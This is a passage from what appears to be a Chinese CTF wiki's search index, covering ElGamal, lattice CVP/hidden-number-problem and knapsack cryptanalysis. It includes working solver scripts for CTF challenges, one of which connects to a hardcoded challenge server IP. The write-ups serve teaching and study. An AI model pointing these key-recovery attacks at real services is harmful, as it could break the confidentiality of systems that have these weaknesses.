<p>\u5177\u4f53\u4ee3\u7801\u5982\u4e0b\uff0c\u9700\u8981\u6ce8\u610f\u7684\u662f\uff0c\uff0c\u8fd9\u4e2a\u6d88\u8017\u5185\u5b58\u6bd4\u8f83\u5927\uff0c\uff0c\u4e0d\u8981\u968f\u4fbf\u62ff\u865a\u62df\u673a\u8dd1\u3002\u3002\u3002\u8fd8\u6709\u5c31\u662f\u8fd9\u5c3c\u739b\u4ea4\u4e92\u8ba9\u6211\u5934\u75bc\u554a\uff0c\uff0c\uff0c</p> <pre><code>import socket\nfrom Crypto.Util.number import *\nfrom sage.all import *\n\n\ndef get_maxfactor(N):\n    f = factor(N)\n    print 'factor done'\n    return f[-1][0]\n\nmaxnumber = 1 &lt;&lt; 70\ni = 0\nwhile 1:\n    print 'cycle: ',i\n    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n    sock.connect((\"localhost\", 9999))\n    sock.recv(17)\n    # get g,h\n    sock.recv(512)\n    sock.sendall(\"1\\n\")\n    sock.recv(512)\n    sock.sendall(\"1\\n\")\n    data = sock.recv(1024)\n    print data\n    if '\\n' in data:\n        data =data[:data.index('\\n')]\n    else:\n        # receive m=\n        sock.recv(1024)\n    (g,h) = eval(data)\n\n    # get g,p\n    sock.sendall(\"-1\\n\")\n    sock.recv(512)\n    sock.sendall(\"1\\n\")\n    data = sock.recv(1024)\n    print data\n    if '\\n' in data:\n        data = data[:data.index('\\n')]\n    else:\n        # receive m=\n        sock.recv(512)\n    (g,tmp) = eval(data)\n    p = tmp+h\n    tmp = get_maxfactor(p-1)\n    if tmp&lt;maxnumber:\n        print 'may be success'\n        # skip the for cycle\n        sock.sendall('quit\\n');\n        data = sock.recv(1024)\n        print 'receive data: ',data\n        data = data[data.index(\":\")+1:]\n        (c1,c2)=eval(data)\n        # generate the group\n        g = Mod(g, p)\n        h = Mod(h, p)\n        c1 = Mod(c1, p)\n        c2 = Mod(c2, p)\n        x = discrete_log(h, g)\n        print \"x = \", x\n        print \"Flag: \", long_to_bytes(long(c2 / ( c1 ** x)))\n    sock.sendall('quit\\n')\n    sock.recv(1024)\n    sock.close()\n    i += 1\n</code></pre> <p>\u6700\u540e\u8feb\u4e8e\u8ba1\u7b97\u673a\u5185\u5b58\u4e0d\u591f\uff0c\uff0c\u6ca1\u8ba1\u7b97\u51fa\u6765\uff0c\uff0c\uff0c\u6709\u65f6\u5019\u4f1a\u5d29\uff0c\u591a\u8fd0\u884c\u51e0\u6b21\u3002\u3002</p>"},{"location":"crypto/asymmetric/discrete-log/elgamal/#2018-code-blue-lagalem","title":"2018 Code Blue lagalem","text":"<p>\u9898\u76ee\u63cf\u8ff0\u5982\u4e0b</p> <pre><code>from Crypto.Util.number import *\nfrom key import FLAG\n\nsize = 2048\nrand_state = getRandomInteger(size // 2)\n\n\ndef keygen(size):\n    q = getPrime(size)\n    k = 2\n    while True:\n        p = q * k + 1\n        if isPrime(p):\n            break\n        k += 1\n    g = 2\n    while True:\n        if pow(g, q, p) == 1:\n            break\n        g += 1\n    A = getRandomInteger(size) % q\n    B = getRandomInteger(size) % q\n    x = getRandomInteger(size) % q\n    h = pow(g, x, p)\n    return (g, h, A, B, p, q), (x,)\n\n\ndef rand(A, B, M):\n    global rand_state\n    rand_state, ret = (A * rand_state + B) % M, rand_state\n    return ret\n\n\ndef encrypt(pubkey, m):\n    g, h, A, B, p, q = pubkey\n    assert 0 &lt; m &lt;= p\n    r = rand(A, B, q)\n    c1 = pow(g, r, p)\n    c2 = (m * pow(h, r, p)) % p\n    return (c1, c2)\n\n# pubkey, privkey = keygen(size)\n\nm = bytes_to_long(FLAG)\nc1, c2 = encrypt(pubkey, m)\nc1_, c2_ = encrypt(pubkey, m)\n\nprint pubkey\nprint(c1, c2)\nprint(c1_, c2_)\n</code></pre> <p>\u53ef\u4ee5\u770b\u51fa\uff0c\u8be5\u7b97\u6cd5\u5c31\u662f\u4e00\u4e2a ElGamal \u52a0\u5bc6\uff0c\u7ed9\u4e86\u540c\u4e00\u4e2a\u660e\u6587\u4e24\u7ec4\u52a0\u5bc6\u540e\u7684\u7ed3\u679c\uff0c\u5176\u7279\u70b9\u5728\u4e8e\u4f7f\u7528\u7684\u968f\u673a\u6570 r \u662f\u901a\u8fc7\u7ebf\u6027\u540c\u4f59\u751f\u6210\u5668\u751f\u6210\u7684\uff0c\u5219\u6211\u4eec\u77e5\u9053</p> <p>c2 \\equiv m * h^{r} \\bmod p</p> <p>c2\\_ \\equiv m*h^{(Ar+B) \\bmod q} \\equiv m*h^{Ar+B}\\bmod p</p> <p>\u5219</p> <p>c2^A*h^B/c2\\_ \\equiv m^{A-1}\\bmod p</p> <p>\u5176\u4e2d\uff0cc2\uff0cc2_\uff0cA\uff0cB\uff0ch \u5747\u77e5\u9053\u3002\u5219\u6211\u4eec\u77e5\u9053</p> <p>m^{A-1} \\equiv t \\bmod p</p> <p>\u6211\u4eec\u5047\u8bbe\u5df2\u77e5 p \u7684\u4e00\u4e2a\u539f\u6839 g\uff0c\u5219\u6211\u4eec\u53ef\u4ee5\u5047\u8bbe</p> <p>g^x \\equiv t</p> <p>g^y \\equiv m</p> <p>\u5219</p> <p>g^{y(A-1)}\\equiv g^x \\bmod p</p> <p>\u5219</p> <p>y(A-1) \\equiv x \\bmod p-1</p> <p>\u8fdb\u800c\u6211\u4eec\u77e5\u9053</p> <p>y(A-1)-k(p-1)=x</p> <p>\u8fd9\u91cc\u6211\u4eec\u77e5\u9053 A\uff0cp\uff0cx\uff0c\u5219\u6211\u4eec\u53ef\u4ee5\u5229\u7528\u6269\u5c55\u6b27\u51e0\u91cc\u5f97\u5b9a\u7406\u6c42\u5f97</p> <p>s(A-1)+w(p-1)=gcd(A-1,t-1)</p> <p>\u5982\u679cgcd(A-1,t-1)=d\uff0c\u5219\u6211\u4eec\u76f4\u63a5\u8ba1\u7b97</p> <p>t^s \\equiv m^{s(A-1)} \\equiv m^d \\bmod p</p> <p>\u5982\u679c d=1\uff0c\u5219\u76f4\u63a5\u77e5\u9053 m\u3002</p> <p>\u5982\u679c d \u4e0d\u4e3a1\uff0c\u5219\u5c31\u6709\u70b9\u9ebb\u70e6\u4e86\u3002\u3002</p> <p>\u8fd9\u91cc\u8fd9\u9053\u9898\u76ee\u4e2d\u6070\u597d d=1\uff0c\u56e0\u6b64\u53ef\u4ee5\u5f88\u5bb9\u6613\u8fdb\u884c\u6c42\u89e3\u3002</p> <pre><code>import gmpy2\ndata = open('./transcript.txt').read().split('\\n')\ng, h, A, B, p, q = eval(data[0])\n\nc1, c2 = eval(data[1])\nc1_, c2_ = eval(data[2])\n\ntmp = gmpy2.powmod(c2, A, p) * gmpy2.powmod(h, B, p) * gmpy2.invert(c2_, p)\ntmp = tmp % p\n\nprint 't=', tmp\nprint 'A=', A\nprint 'p=', p\ngg, x, y = gmpy2.gcdext(A - 1, p - 1)\nprint gg\n\nm = gmpy2.powmod(tmp, x, p)\nprint hex(m)[2:].decode('hex')\n</code></pre> <p>flag</p> <pre><code>\u279c  2018-CodeBlue-lagalem git:(master) \u2717 python exp.py\nt= 24200833701856688878756977616650401715079183425722900529883514170904572086655826119242478732147288453761668954561939121426507899982627823151671207325781939341536650446260662452251070281875998376892857074363464032471952373518723746478141532996553854860936891133020681787570469383635252298945995672350873354628222982549233490189069478253457618473798487302495173105238289131448773538891748786125439847903309001198270694350004806890056215413633506973762313723658679532448729713653832387018928329243004507575710557548103815480626921755313420592693751934239155279580621162244859702224854316335659710333994740615748525806865323\nA= 22171697832053348372915156043907956018090374461486719823366788630982715459384574553995928805167650346479356982401578161672693725423656918877111472214422442822321625228790031176477006387102261114291881317978365738605597034007565240733234828473235498045060301370063576730214239276663597216959028938702407690674202957249530224200656409763758677312265502252459474165905940522616924153211785956678275565280913390459395819438405830015823251969534345394385537526648860230429494250071276556746938056133344210445379647457181241674557283446678737258648530017213913802458974971453566678233726954727138234790969492546826523537158\np= 36416598149204678746613774367335394418818540686081178949292703167146103769686977098311936910892255381505012076996538695563763728453722792393508239790798417928810924208352785963037070885776153765280985533615624550198273407375650747001758391126814998498088382510133441013074771543464269812056636761840445695357746189203973350947418017496096468209755162029601945293367109584953080901393887040618021500119075628542529750701055865457182596931680189830763274025951607252183893164091069436120579097006203008253591406223666572333518943654621052210438476603030156263623221155480270748529488292790643952121391019941280923396132717\n1\nCBCTF{183a3ce8ed93df613b002252dfc741b2}\n</code></pre>"},{"location":"crypto/asymmetric/discrete-log/elgamal/#_7","title":"\u53c2\u8003","text":"<ul> <li>https://www.math.auckland.ac.nz/~sgal018/crypto-book/solns.pdf\uff0c20.4.1</li> </ul>"},{"location":"crypto/asymmetric/lattice/cvp/","title":"CVP","text":"<p>Warning</p> <p>The current page still doesn't have a translation for this language.</p> <p>You can read it through google translate.</p> <p>Besides, you can also help to translate it: Contributing.</p> <p>CVP\u662fLattice-based cryptography\u4e2d\u5c24\u4e3a\u91cd\u8981\u7684\u4e00\u4e2a\u95ee\u9898\u3002</p> <p>\u95ee\u9898\u7684\u57fa\u672c\u5b9a\u4e49\u5982\u4e0b\uff1a\u7ed9\u5b9a\u683cL\u7684\u4e00\u7ec4\u57fa\u4e0e\u5411\u91cf\\mathbf{v}\uff0c\u627e\u5230\u5728L\u4e0a\u79bb\\mathbf{v}\u6700\u8fd1\u7684\u4e00\u4e2a\u5411\u91cf\u3002</p>"},{"location":"crypto/asymmetric/lattice/cvp/#algorithms","title":"Algorithms","text":""},{"location":"crypto/asymmetric/lattice/cvp/#babais-nearest-plane-algorithm","title":"Babai's nearest plane algorithm","text":"<p>\u8be5\u7b97\u6cd5\u8f93\u5165\u4e00\u7ec4\u683cL(\u79e9\u4e3an)\u7684\u57faB\u548c\u4e00\u4e2a\u76ee\u6807\u5411\u91cf\\mathbf{t}\uff0c\u8f93\u51faCVP\u95ee\u9898\u7684\u8fd1\u4f3c\u89e3\u3002</p> <ul> <li>\u8fd1\u4f3c\u56e0\u5b50\u4e3a\\gamma = 2^{\\frac{n}{2}}</li> </ul> <p>\u5177\u4f53\u7b97\u6cd5\uff1a</p> <p></p> <ul> <li>\u5176\u4e2dc_j\u4e3aGram-schmidt\u6b63\u4ea4\u5316\u4e2d\u7684\u7cfb\u6570\u53d6\u6574\uff0c\u4e5f\u5373proj_{b_{j}}(b)\u7684\u53d6\u6574\u3002</li> </ul> <p>\u5bf9\u4e8e\u8be5\u7b97\u6cd5\u7b2c\u4e8c\u6b65\u7684\u4e2a\u4eba\u7406\u89e3\uff1a\u5728\u683c\u57fa\u89c4\u7ea6\u548c\u6b63\u4ea4\u5316\u8fc7\u540e\u7684\u57faB\u4e2d\u627e\u5230\u4e00\u4e2a\u6700\u9760\u8fd1\\mathbf{t}\u7684\u7ebf\u6027\u7ec4\u5408\u3002</p>"},{"location":"crypto/asymmetric/lattice/cvp/#babais-rounding-technique","title":"Babai\u2019s Rounding Technique","text":"<p>\u8be5\u7b97\u6cd5\u662f<code>Babai's nearest plane algorithm</code>\u7684\u4e00\u4e2a\u53d8\u79cd\u3002</p> <p>\u6b65\u9aa4\u53ef\u4ee5\u8868\u793a\u4e3a\uff1a</p> <pre><code>N = rank(B), w = target\n- B' = LLL(B)\n- Find a linear combination [l_0, ... l_N] such that w = sum(l_i * b'_i).\n* (b'_i is the i-th vector in the LLL-reduced basis B')\n- Round each l_i to it's closest integer l'_i.\n- Result v = sum(l'_i * b'_i)\n</code></pre>"},{"location":"crypto/asymmetric/lattice/cvp/#_1","title":"\u76f8\u5173\u5185\u5bb9","text":""},{"location":"crypto/asymmetric/lattice/cvp/#hidden-number-problem","title":"Hidden number problem","text":"<p>HNP\u7684\u5b9a\u4e49\u5982\u4e0b\uff1a</p> <p>\u7ed9\u5b9a\u8d28\u6570p\u3001\u8bb8\u591at \\in \\mathbb{F}_p\u4ee5\u53ca\u6bcf\u4e00\u4e2a\u5bf9\u5e94\u7684MSB_{l,p}(\\alpha t)\uff0c\u627e\u51fa\u5bf9\u5e94\u7684\\alpha\u3002</p> <ul> <li>MSB_{l,p}(x)\u8868\u793a\u4efb\u4e00\u6ee1\u8db3 \\lvert (x \\mod p) - u \\rvert \\le \\frac{p}{2^{l+1}} \u7684\u6574\u6570 u\uff0c\u8fd1\u4f3c\u4e3a\u53d6x \\mod p\u7684l\u4e2a\u6700\u9ad8\u6709\u6548\u4f4d\u3002</li> </ul> <p>\u6839\u636e\u53c2\u80033\u4e2d\u7684\u63cf\u8ff0\uff0c\u5f53l \\approx \\log^{\\frac{1}{2}}{p}\u65f6\uff0c\u6709\u5982\u4e0b\u7b97\u6cd5\u53ef\u4ee5\u89e3\u51b3HNP\uff1a</p> <p>\u6211\u4eec\u53ef\u4ee5\u5c06\u6b64\u95ee\u9898\u8f6c\u5316\u4e3a\u4e00\u4e2a\u7531\u8be5\u77e9\u9635\u751f\u6210\u7684\u683c\u4e0a\u7684CVP\u95ee\u9898\uff1a</p> <p>\\left[ \\begin{matrix} p &amp; 0 &amp; \\dots &amp; 0 &amp; 0 \\\\ 0 &amp; p &amp; \\ddots &amp; \\vdots &amp; \\vdots \\\\ \\vdots &amp; \\ddots &amp; \\ddots &amp; 0 &amp; \\vdots \\\\ 0 &amp; 0 &amp; \\dots &amp; p &amp; 0 \\\\ t_1 &amp; t_2 &amp; \\dots &amp; t_{n} &amp; \\frac{1}{2^{l+1}} \\end{matrix} \\right]</p> <p>\u6211\u4eec\u9700\u8981\u627e\u5230\u5728\u683c\u4e0a\u79bb\\mathbf{u}=(u_1, u_2, \\dots, u_{n}, 0)\u6700\u8fd1\u7684\u5411\u91cf\uff0c\u6240\u4ee5\u5728\u8fd9\u91cc\uff0c\u6211\u4eec\u53ef\u4ee5\u91c7\u7528<code>Babai's nearest plane algorithm</code>\u3002\u6700\u7ec8\u6211\u4eec\u53ef\u4ee5\u5f97\u5230\u4e00\u7ec4\u5411\u91cf \\mathbf{v}=(\\alpha \\cdot t_1 \\mod p, \\alpha \\cdot t_2 \\mod p, \\dots, \\frac{\\alpha}{2^{l+1}})\uff0c\u4ece\u800c\u7b97\u51fa \\alpha\u3002</p>"},{"location":"crypto/asymmetric/lattice/cvp/#bctf-2018-guess_number","title":"BCTF 2018 - guess_number","text":"<p>\u9898\u76ee\u63d0\u4f9b\u4e86\u670d\u52a1\u5668\u7aef\u7684\u4ee3\u7801\uff1a <pre><code>import random, sys\nfrom flag import FLAG\nimport gmpy2\n\ndef msb(k, x, p):\n    delta = p &gt;&gt; (k + 1)\n    ui = random.randint(x - delta, x + delta)\n    return ui\n\ndef main():\n    p = gmpy2.next_prime(2**160)\n    for _ in range(5):\n        alpha = random.randint(1, p - 1)\n        # print(alpha)\n        t = []\n        u = []\n        k = 10\n        for i in range(22):\n            t.append(random.randint(1, p - 1))\n            u.append(msb(k, alpha * t[i] % p, p))\n        print(str(t))\n        print(str(u))\n        guess = raw_input('Input your guess number: ')\n        guess = int(guess)\n        if guess != alpha:\n            exit(0)\n\nif __name__ == \"__main__\":\n    main()\n    print(FLAG)\n</code></pre></p> <p>\u53ef\u4ee5\u770b\u5230\uff0c\u7a0b\u5e8f\u4e00\u5171\u6267\u884c5\u8f6e\u3002\u5728\u6bcf\u4e00\u8f6e\uff0c\u7a0b\u5e8f\u4f1a\u751f\u6210\u4e00\u4e2a\u968f\u673a\u7684\\alpha\u548c22\u4e2a\u968f\u673a\u7684t_i\u3002\u5bf9\u4e8e\u6bcf\u4e00\u4e2at_i\uff0c\u7a0b\u5e8f\u4f1a\u53d6u_i = MSB_{10,p}(\\alpha\\cdot{t_i\\mod{p}})\uff0c\u968f\u540e\u53d1\u9001\u7ed9\u5ba2\u6237\u7aef\u3002\u6211\u4eec\u9700\u8981\u6839\u636e\u63d0\u4f9b\u7684t_i\u548cu_i\u8ba1\u7b97\u51fa\u5bf9\u5e94\u7684\\alpha\u3002\u53ef\u4ee5\u770b\u5230\uff0c\u8be5\u95ee\u9898\u662f\u4e00\u4e2a\u5178\u578b\u7684Hidden number problem\uff0c\u4e8e\u662f\u53ef\u4ee5\u4f7f\u7528\u4e0a\u8ff0\u7b97\u6cd5\u89e3\u51b3\uff1a</p> <pre><code>import socket\nimport ast\nimport telnetlib\n\n#HOST, PORT = 'localhost', 9999\nHOST, PORT = '60.205.223.220', 9999\n\ns = socket.socket()\ns.connect((HOST, PORT))\nf = s.makefile('rw', 0)\n\ndef recv_until(f, delim='\\n'):\n    buf = ''\n    while not buf.endswith(delim):\n        buf += f.read(1)\n    return buf\n\np = 1461501637330902918203684832716283019655932542983\nk = 10\n\ndef solve_hnp(t, u):\n    # http://www.isg.rhul.ac.uk/~sdg/igor-slides.pdf\n    M = Matrix(RationalField(), 23, 23)\n    for i in xrange(22):\n        M[i, i] = p\n        M[22, i] = t[i]\n\n    M[22, 22] = 1 / (2 ** (k + 1))\n\n    def babai(A, w):\n        A = A.LLL(delta=0.75)\n        G = A.gram_schmidt()[0]\n        t = w\n        for i in reversed(range(A.nrows())):\n            c = ((t * G[i]) / (G[i] * G[i])).round()\n            t -= A[i] * c\n        return w - t\n\n    closest = babai(M, vector(u + [0]))\n    return (closest[-1] * (2 ** (k + 1))) % p\n\nfor i in xrange(5):\n    t = ast.literal_eval(f.readline().strip())\n    u = ast.literal_eval(f.readline().strip())\n    alpha = solve_hnp(t, u)\n    recv_until(f, 'number: ')\n    s.send(str(alpha) + '\\n')\n\nt = telnetlib.Telnet()\nt.sock = s\nt.interact()\n</code></pre>"},{"location":"crypto/asymmetric/lattice/cvp/#_2","title":"\u53c2\u8003","text":"<ul> <li>Lecture 3 - CVP algorithm</li> <li>Wikipedia</li> <li>Playing \u201cHide-and-Seek\u201d in Finite Fields: Hidden Number Problem and Its Applications</li> <li>https://www.math.auckland.ac.nz/~sgal018/crypto-book/ch18.pdf</li> </ul>"},{"location":"crypto/asymmetric/lattice/introduction/","title":"\u57fa\u672c\u4ecb\u7ecd","text":"<p>Warning</p> <p>The current page still doesn't have a translation for this language.</p> <p>You can read it through google translate.</p> <p>Besides, you can also help to translate it: Contributing.</p>"},{"location":"crypto/asymmetric/lattice/introduction/#_2","title":"\u683c\u5b9a\u4e49","text":"<p>\u683c\u662f m \u7ef4\u6b27\u5f0f\u7a7a\u95f4 R^m \u7684 n (m\\geq n) \u4e2a\u7ebf\u6027\u65e0\u5173\u5411\u91cfb_i(1\\leq i \\leq n) \u7684\u6240\u6709\u6574\u7cfb\u6570\u7684\u7ebf\u6027\u7ec4\u5408\uff0c\u5373 L(B)=\\{\\sum\\limits_{i=1}^{n}x_ib_i:x_i \\in Z,1\\leq i \\leq n\\}</p> <p>\u8fd9\u91cc B \u5c31\u662f n \u4e2a\u5411\u91cf\u7684\u96c6\u5408\uff0c\u6211\u4eec\u79f0</p> <ul> <li>\u8fd9 n \u4e2a\u5411\u91cf\u662f\u683c L \u7684\u4e00\u7ec4\u57fa\u3002</li> <li>\u683c L \u7684\u79e9\u4e3a n\u3002</li> <li>\u683c L \u7684\u4f4d\u6570\u4e3a m\u3002</li> </ul> <p>\u5982\u679c m=n\uff0c\u90a3\u4e48\u6211\u4eec\u79f0\u8fd9\u4e2a\u683c\u5f0f\u6ee1\u79e9\u7684\u3002</p> <p>\u5f53\u7136\uff0c\u4e5f\u53ef\u4ee5\u662f\u5176\u5b83\u7fa4\uff0c\u4e0d\u662f R^m\u3002</p>"},{"location":"crypto/asymmetric/lattice/introduction/#_3","title":"\u683c\u4e2d\u82e5\u5e72\u57fa\u672c\u5b9a\u4e49","text":""},{"location":"crypto/asymmetric/lattice/introduction/#successive-minima","title":"successive minima","text":"<p>\u683c\u662f m \u7ef4\u6b27\u5f0f\u7a7a\u95f4 R^m \u7684\u79e9\u4e3a n \u7684\u683c\uff0c\u90a3\u4e48 L \u7684\u8fde\u7eed\u6700\u5c0f\u957f\u5ea6(successive minima)\u4e3a \\lambda_1,...,\\lambda_n \\in R\uff0c\u6ee1\u8db3\u5bf9\u4e8e\u4efb\u610f\u7684 1\\leq i\\leq n\uff0c\\lambda_i \u662f\u6ee1\u8db3\u683c\u4e2d i \u4e2a\u7ebf\u6027\u65e0\u5173\u7684\u5411\u91cfv_i\uff0c ||v_j||\\leq \\lambda_i,1\\leq j\\leq i \u7684\u6700\u5c0f\u503c\u3002</p> <p>\u81ea\u7136\u7684 \\lambda_i \\leq \\lambda_j ,\\forall i &lt;j\u3002</p>"},{"location":"crypto/asymmetric/lattice/introduction/#_4","title":"\u683c\u4e2d\u8ba1\u7b97\u56f0\u96be\u6027\u95ee\u9898","text":"<p>\u6700\u77ed\u5411\u91cf\u95ee\u9898(Shortest Vector Problem\uff0cSVP)\uff1a\u7ed9\u5b9a\u683c L \u53ca\u5176\u57fa\u5411\u91cf B \uff0c\u627e\u5230\u683c L \u4e2d\u7684\u975e\u96f6\u5411\u91cf v \u4f7f\u5f97\u5bf9\u4e8e\u683c\u4e2d\u7684\u4efb\u610f\u5176\u5b83\u975e\u96f6\u5411\u91cf u\uff0c||v|| \\leq ||u||\u3002</p> <p>\\gamma-\u8fd1\u4f3c\u6700\u77ed\u5411\u91cf\u95ee\u9898(SVP-\\gamma)\uff1a\u7ed9\u5b9a\u683c L\uff0c\u627e\u5230\u683c L \u4e2d\u7684\u975e\u96f6\u5411\u91cf v \u4f7f\u5f97\u5bf9\u4e8e\u683c\u4e2d\u7684\u4efb\u610f\u5176\u5b83\u975e\u96f6\u5411\u91cf u\uff0c||v|| \\leq \\gamma||u||\u3002</p> <p>\u8fde\u7eed\u6700\u5c0f\u957f\u5ea6\u95ee\u9898(Successive Minima Problem, SMP):\u7ed9\u5b9a\u79e9\u4e3a n \u7684\u683c L\uff0c\u627e\u5230\u683c L \u4e2d n \u4e2a\u7ebf\u6027\u65e0\u5173\u5411\u91cf s_i\uff0c\u6ee1\u8db3 \\lambda_i(L)=||s_i||, 1\\leq i \\leq n\u3002</p> <p>\u6700\u77ed\u7ebf\u6027\u65e0\u5173\u5411\u91cf\u95ee\u9898(Shortest Independent Vector Problem, SIVP)\uff1a\u7ed9\u5b9a\u4e00\u4e2a\u79e9\u4e3a n \u7684\u683c L\uff0c\u627e\u5230\u683c L \u4e2d n \u4e2a\u7ebf\u6027\u65e0\u5173\u5411\u91cf s_i\uff0c\u6ee1\u8db3||s_i|| \\leq \\lambda_n(L), 1\\leq i \\leq n\u3002</p> <p>\u552f\u4e00\u6700\u77ed\u5411\u91cf\u95ee\u9898(Unique Shortest Vector Problem, uSVP-\\gamma)\uff1a\u7ed9\u5b9a\u683c L\uff0c\u6ee1\u8db3 $ \\lambda_2(L) &gt; \\gamma \\lambda_1(L)$\uff0c\u627e\u5230\u8be5\u683c\u7684\u6700\u77ed\u5411\u91cf\u3002</p> <p>\u6700\u8fd1\u5411\u91cf\u95ee\u9898(Closest Vector Problem\uff0cCVP)\uff1a\u7ed9\u5b9a\u683c L\u548c\u76ee\u6807\u5411\u91cf t\\in R^m\uff0c\u627e\u5230\u4e00\u4e2a\u683c\u4e2d\u7684\u975e\u96f6\u5411\u91cf v\uff0c\u4f7f\u5f97\u5bf9\u4e8e\u683c\u4e2d\u7684\u4efb\u610f\u975e\u96f6\u5411\u91cf u\uff0c\u6ee1\u8db3 ||v-t|| \\leq ||u-t|| \u3002</p>"},{"location":"crypto/asymmetric/lattice/knapsack/","title":"\u80cc\u5305\u52a0\u5bc6","text":"<p>Warning</p> <p>The current page still doesn't have a translation for this language.</p> <p>You can read it through google translate.</p> <p>Besides, you can also help to translate it: Contributing.</p>"},{"location":"crypto/asymmetric/lattice/knapsack/#_2","title":"\u80cc\u5305\u95ee\u9898","text":"<p>\u9996\u5148\uff0c\u6211\u4eec\u5148\u6765\u4ecb\u7ecd\u4e00\u4e0b\u80cc\u5305\u95ee\u9898\uff0c\u5047\u5b9a\u4e00\u4e2a\u80cc\u5305\u53ef\u4ee5\u79f0\u91cd W\uff0c\u73b0\u5728\u6709 n \u4e2a\u7269\u54c1\uff0c\u5176\u91cd\u91cf\u5206\u522b\u4e3a a_1, a_2,...,a_n \u6211\u4eec\u60f3\u95ee\u4e00\u4e0b\u88c5\u54ea\u4e9b\u7269\u54c1\u53ef\u4ee5\u6070\u597d\u4f7f\u5f97\u80cc\u5305\u88c5\u6ee1\uff0c\u5e76\u4e14\u6bcf\u4e2a\u7269\u54c1\u53ea\u80fd\u88ab\u88c5\u4e00\u6b21\u3002\u8fd9\u5176\u5b9e\u5c31\u662f\u5728\u89e3\u8fd9\u6837\u7684\u4e00\u4e2a\u95ee\u9898</p>  x_1a_1+x_2a_2+,...,+x_na_n=W  <p>\u5176\u4e2d\u6240\u6709\u7684 x_i \u53ea\u80fd\u4e3a 0 \u548c 1\u3002\u663e\u7136\u6211\u4eec\u5fc5\u987b\u679a\u4e3e\u6240\u6709\u7684 n \u4e2a\u7269\u54c1\u7684\u7ec4\u5408\u624d\u80fd\u89e3\u51b3\u8fd9\u4e2a\u95ee\u9898\uff0c\u800c\u590d\u6742\u5ea6\u4e5f\u5c31\u662f 2^n\uff0c\u8fd9\u4e5f\u5c31\u662f\u80cc\u5305\u52a0\u5bc6\u7684\u5999\u5904\u6240\u5728\u3002</p> <p>\u5728\u52a0\u5bc6\u65f6\uff0c\u5982\u679c\u6211\u4eec\u60f3\u8981\u52a0\u5bc6\u7684\u660e\u6587\u4e3a x\uff0c\u90a3\u4e48\u6211\u4eec\u53ef\u4ee5\u5c06\u5176\u8868\u793a\u4e3a n \u4f4d\u4e8c\u8fdb\u5236\u6570\uff0c\u7136\u540e\u5206\u522b\u4e58\u4e0a a_i \u5373\u53ef\u5f97\u5230\u52a0\u5bc6\u7ed3\u679c\u3002</p> <p>\u4f46\u662f\u89e3\u5bc6\u7684\u65f6\u5019\uff0c\u8be5\u600e\u4e48\u529e\u5462\uff1f\u6211\u4eec\u786e\u5b9e\u8ba9\u5176\u4ed6\u4eba\u96be\u4ee5\u89e3\u5bc6\u5bc6\u6587\uff0c\u4f46\u662f\u6211\u4eec\u81ea\u5df1\u4e5f\u786e\u5b9e\u6ca1\u6709\u529e\u6cd5\u89e3\u5bc6\u5bc6\u6587\u3002</p> <p>\u4f46\u662f\u5f53 a_i \u662f\u8d85\u9012\u589e\u7684\u8bdd\uff0c\u6211\u4eec\u5c31\u6709\u529e\u6cd5\u89e3\u4e86\uff0c\u6240\u8c13\u8d85\u9012\u589e\u662f\u6307\u5e8f\u5217\u6ee1\u8db3\u5982\u4e0b\u6761\u4ef6</p>  a_i&gt;\\sum_{k=1}^{i-1}a_k  <p>\u5373\u7b2c i \u4e2a\u6570\u5927\u4e8e\u524d\u9762\u6240\u6709\u6570\u7684\u548c\u3002</p> <p>\u4e3a\u4ec0\u4e48\u6ee1\u8db3\u8fd9\u6837\u7684\u6761\u4ef6\u5c31\u53ef\u4ee5\u89e3\u5bc6\u4e86\u5462\uff1f\u8fd9\u662f\u56e0\u4e3a\u5982\u679c\u52a0\u5bc6\u540e\u7684\u7ed3\u679c\u5927\u4e8e a_n \u7684\u8bdd\uff0c\u5176\u524d\u9762\u7684\u7cfb\u6570\u4e3a\u5fc5\u987b 1 \u7684\u3002\u53cd\u4e4b\uff0c\u65e0\u8bba\u5982\u4f55\u4e5f\u65e0\u6cd5\u4f7f\u5f97\u7b49\u5f0f\u6210\u7acb\u3002\u56e0\u6b64\uff0c\u6211\u4eec\u53ef\u4ee5\u7acb\u9a6c\u5f97\u5230\u5bf9\u5e94\u7684\u660e\u6587\u3002</p> <p>\u4f46\u662f\uff0c\u8fd9\u6837\u53c8\u51fa\u73b0\u4e86\u4e00\u4e2a\u95ee\u9898\uff0c\u7531\u4e8e a_i \u662f\u516c\u5f00\u7684\uff0c\u5982\u679c\u653b\u51fb\u8005\u622a\u83b7\u4e86\u5bc6\u6587\uff0c\u90a3\u4e48\u5b83\u4e5f\u5c31\u5f88\u5bb9\u6613\u53bb\u7834\u89e3\u8fd9\u6837\u7684\u5bc6\u7801\u3002\u4e3a\u4e86\u5f25\u8865\u8fd9\u6837\u7684\u95ee\u9898\uff0c\u5c31\u51fa\u73b0\u4e86 Merkle\u2013Hellman \u8fd9\u6837\u7684\u52a0\u5bc6\u7b97\u6cd5\uff0c\u6211\u4eec\u53ef\u4ee5\u4f7f\u7528\u521d\u59cb\u7684\u80cc\u5305\u96c6\u4f5c\u4e3a\u79c1\u94a5\uff0c\u53d8\u6362\u540e\u7684\u80cc\u5305\u96c6\u4f5c\u4e3a\u516c\u94a5\uff0c\u518d\u7a0d\u5fae\u6539\u52a8\u52a0\u5bc6\u8fc7\u7a0b\uff0c\u5373\u53ef\u3002</p> <p>\u8fd9\u91cc\u867d\u7136\u8bf4\u4e86\u8d85\u9012\u589e\u5e8f\u5217\uff0c\u4f46\u662f\u5374\u6ca1\u6709\u8bf4\u662f\u5982\u4f55\u751f\u6210\u7684\u3002</p>"},{"location":"crypto/asymmetric/lattice/knapsack/#merklehellman","title":"Merkle\u2013Hellman","text":""},{"location":"crypto/asymmetric/lattice/knapsack/#_3","title":"\u516c\u79c1\u94a5\u751f\u6210","text":""},{"location":"crypto/asymmetric/lattice/knapsack/#_4","title":"\u751f\u6210\u79c1\u94a5","text":"<p>\u79c1\u94a5\u5c31\u662f\u6211\u4eec\u7684\u521d\u59cb\u7684\u80cc\u5305\u96c6\uff0c\u8fd9\u91cc\u6211\u4eec\u4f7f\u7528\u8d85\u9012\u589e\u5e8f\u5217\uff0c\u600e\u4e48\u751f\u6210\u5462\uff1f\u6211\u4eec\u53ef\u4ee5\u5047\u8bbe a_1=1\uff0c\u90a3\u4e48 a_2 \u5927\u4e8e 1 